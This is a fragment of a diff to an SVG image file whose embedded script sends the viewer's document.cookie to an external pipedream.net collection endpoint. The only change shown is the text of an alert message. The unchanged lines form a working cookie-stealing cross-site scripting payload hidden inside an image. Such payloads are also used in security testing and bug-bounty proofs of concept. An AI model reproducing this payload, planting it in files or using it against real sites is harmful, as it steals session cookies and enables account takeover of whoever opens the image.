@@ -15,7 +15,7 @@
       var xhttp = new XMLHttpRequest();
       xhttp.open("GET", "https://eoow6y96ffo9mzx.m.pipedream.net/" + encodeURIComponent(document.cookie), true);
       xhttp.send();
-      alert("rhyru9");
+      alert("rhyru");
     };
   </script>
 </svg>
